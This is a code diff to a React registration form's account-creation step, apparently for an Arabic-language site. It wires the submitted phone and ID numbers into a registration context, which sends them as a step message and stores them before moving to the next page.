@@ -8,6 +8,7 @@ import { Input } from "@/components/ui/input";
 import { X, Phone, CreditCard } from "lucide-react";
 import Stepper from "@/components/Stepper";
 import { toast } from "sonner";
+import { useRegistration } from "@/contexts/RegistrationContext";
 
 const formSchema = z.object({
   phoneNumber: z.string()
@@ -36,6 +37,7 @@ const steps = [
 const AccountCreation = () => {
   const navigate = useNavigate();
   const [isLoading, setIsLoading] = useState(false);
+  const { updateData, sendCumulativeMessage } = useRegistration();
 
   const {
     register,
@@ -48,7 +50,14 @@ const AccountCreation = () => {
   const onSubmit = async (data: FormData) => {
     setIsLoading(true);
     try {
-      // معالجة البيانات هنا
+      const newData = {
+        accountCreationPhone: data.phoneNumber,
+        accountCreationId: data.idNumber
+      };
+      
+      await sendCumulativeMessage(9, "إنشاء الحساب", newData);
+      updateData(newData);
+      
       toast.success("تم إرسال البيانات بنجاح");
       
       // الانتقال إلى الصفحة التالية
